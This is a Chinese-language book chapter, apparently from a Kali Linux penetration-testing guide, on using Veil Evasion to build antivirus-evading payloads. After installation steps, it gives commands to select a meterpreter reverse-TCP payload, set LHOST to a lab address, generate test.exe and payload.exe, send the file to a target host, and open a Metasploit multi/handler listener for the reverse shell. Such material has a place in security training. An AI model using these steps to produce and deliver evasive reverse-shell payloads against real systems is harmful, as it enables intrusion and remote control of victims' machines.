    # 第 35 章


    ## 反杀毒 Payload 攻击


    ![](img/image_rsrc49Z.jpg)


    Kali Linux 提供了一个名为 `Veil Evasion` 的工具，它可以用于生成不同类型的攻击 payload 文件。其中，生成的攻击 payload
    文件在大多数情况下可以绕过常见的反杀毒软件。本节将介绍如何使用 `Veil Evasion` 工具生成反杀毒攻击 payload 文件以实现攻击。


    ## 安装并初始化 Veil Evasion 工具


    Kali Linux 默认没有安装 `Veil Evasion` 工具。因此，在使用该工具之前需要先对其进行安装。


    执行命令如下：


    ```bash

    root@exampleserver:～# apt-get install veil-evasion -y

    ```


    执行上述命令后，如果没有报错，则说明 `Veil Evasion` 工具已安装成功。接下来，你可以启动该工具。


    具体步骤如下：


    1) 启动 `Veil Evasion` 工具。


    执行命令如下：


    ```bash

    root@exampleserver:～# veil

    ```


    上述输出信息显示了当前操作系统的基本信息以及 `Veil Evasion` 工具的安装位置。


    这里会提示是否继续安装 `Veil` 工具，输入 `y` 继续安装，随后将显示以下信息。


    [＊] 正在初始化包安装

    [＊] 正在下载二进制依赖


    从输出信息可以看出，软件包正在初始化。在此过程中还会安装其他软件，即 `Python 3.4.4`、`pywin32-220`、`pycrypto-2.6.1`、`Ruby
    1.8.7-p371` 和 `Autolt v3.3.14.2`。其中，首先安装 `Python 3.4.4`。


    2) 此对话框是 `Python 3.4.4` 的欢迎界面。此时，点击 `Next` 按钮，将显示选择安装位置的对话框。


    3) 点击 `Next` 按钮，将显示自定义 `Python` 包的对话框。


    4) 点击 `Next` 按钮，将显示 `Python` 安装完成的对话框。


    5) 点击 `Finish` 按钮，将显示 `pywin32` 安装对话框。


    6) 点击 `Next` 按钮，将显示设置安装位置的对话框。


    7) 点击 `Next` 按钮，将显示准备安装的对话框。


    8) 点击 `Next` 按钮开始安装 `pywin32` 程序。安装完成后，将显示安装完成的对话框。


    9) 点击 `End` 按钮，将显示 `pycrypto` 安装对话框。


    10) 点击 `Next` 按钮，将显示设置安装位置的对话框。


    11) 点击 `Next` 按钮，将显示准备安装的对话框。


    12) 点击 `Next` 按钮开始安装 `pycrypto` 程序。安装完成后，将显示对话框。


    13) 点击 `End` 按钮，将显示选择并设置语言的对话框。


    14) 此处使用默认语言 `English` 并点击 `OK` 按钮，将显示安装 `Ruby` 的许可协议对话框。


    15) 选取 `I accept the License` 单选按钮，然后点击 `Next` 按钮。将显示选择安装位置的对话框。


    16) 此处使用默认设置，然后点击 `Install` 按钮开始安装 `Ruby` 程序。安装完成后，将显示所示对话框。


    17) 点击 `Finish` 按钮，将显示 `Autolt` 的欢迎对话框。


    18) 点击 `Next` 按钮，将显示安装 `Autolt` 程序的许可协议信息。


    19) 点击 `I Agree` 按钮，将显示设置对话框。


    20) 此处使用默认设置，然后点击 `Next` 按钮，将显示对话框。


    21) 此处使用默认设置，然后点击 `Next` 按钮，将显示选择组件的对话框。


    22) 点击 `Next` 按钮，将显示设置安装位置的对话框。


    23) 在此处点击 `Install` 按钮开始安装 `Autolt` 程序。安装完成后，显示对话框。


    24) 当上述程序安装完成后，`Veil` 工具将完成初始化。


    ## 生成反杀毒攻击 payload


    通过配置设置，`Veil` 工具可以正常使用。接下来，我们将使用 `Veil Evasion` 工具生成反杀毒攻击 payload 文件。


    使用 `Veil Evasion` 工具生成反杀毒攻击 payload 文件。


    具体步骤如下：


    1) 启动 `Veil Evasion` 工具。


    执行命令如下：


    ```bash

    root@exampleserver:～# veil

    ```


    从输出信息中可以看出，命令行提示符为 `Veil >`。可以说 `Veil` 工具的交互模式已成功进入。接下来，你可以选择工具创建攻击 payload 文件。


    2) 使用 `Evasion` 工具。


    执行命令如下：


    ```

    Veil>: use Evasion

    ```


    从输出信息可以看出，加载了 41 种攻击 payload。


    3) 查看 `Evasion` 工具支持的攻击。执行以下命令：


    ```

    Veil/Evasion>: list

    ```


    从输出信息中可以看到所有攻击 payload。例如，这里我们选择 `meterpreter/revtcp.py`。


    执行命令如下：


    ```

    Veil/Evasion>: use meterpreter/revtcp

    ```


    4) 配置 `LHOST` 选项并查看所有配置。


    执行命令如下：


    ```

    [meterpreter/revtcp_]: set LHOST 192.168.29.134

    [meterpreter/revtcp_]: options

    ```


    从输出信息可以看出，`LHOST` 选项已成功配置。接下来可以生成攻击 payload。


    5) 生成攻击 payload。


    执行命令如下：


    ```

    [meterpreter/revtcp_]: generate

    ```


    从输出信息可以看出生成了可执行文件 `test.exe`，该文件保存在 `/var/lib/veil/output/compiled/`。此时将 `test.exe`
    发送到目标主机即可使用该 payload。


    用户也可以在命令行模式下生成攻击 payload。这里以 `rev_tcp` 模块为例，执行命令如下：


    ```bash

    root@exampleserver:～ veil -t Evasion -p meterpreter/rev_tcp.py --ip 192.168.29.134
    --port 4444 payload.exe

    ```


    从输出信息可以看出成功生成了可执行文件 `payload.exe`。


    同样，在用户创建了攻击 payload 文件后，还需要创建一个远程监听器。这样，当目标主机执行攻击 payload 文件时，它会主动与攻击主机建立连接。


    使用 Metasploit 的 `exploit/multi/handler` 模块创建监听器如下：


    ```bash

    root@exampleserver:～# msfconsole

    msf5 exploit(multi/handler)> exploit

    ```

